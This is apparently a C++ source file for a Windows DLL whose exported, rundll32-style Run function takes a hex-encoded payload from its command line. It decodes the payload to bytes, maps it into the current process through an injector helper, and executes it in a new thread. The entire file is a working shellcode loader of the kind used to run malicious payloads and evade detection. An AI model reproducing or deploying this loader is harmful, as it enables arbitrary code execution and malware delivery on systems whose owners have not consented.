#include "pch.h"
#include <iostream>
#include <string>
#include <Windows.h>
#include "injector.h"

#pragma comment (lib, "OneCore.lib")	

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

extern "C" __declspec(dllexport)
void WINAPI Run(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	const char* payload = lpszCmdLine;
	const int size = strlen(payload) / 2;
	unsigned char* buf = new unsigned char[size];
	BOOL result = Injector::hexToBytes(payload, buf, strlen(payload) / 2);
	if (!result) {
		printf("[-] failed to convert hex string\n");
		return;
	}

	HANDLE hProcess = NULL;
	PVOID pAddress = NULL;
	HANDLE hThread = NULL;
	hProcess = GetCurrentProcess();
	result = Injector::RemoteMapInject(hProcess, buf, size, &pAddress);
	if (!result) {
		return;
	}
	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);
	if (!hThread) {
		printf("[-] CreateThread failed with error: %d\n", GetLastError());
		return;
	}
	WaitForSingleObject(hThread, INFINITE);
	return;
}






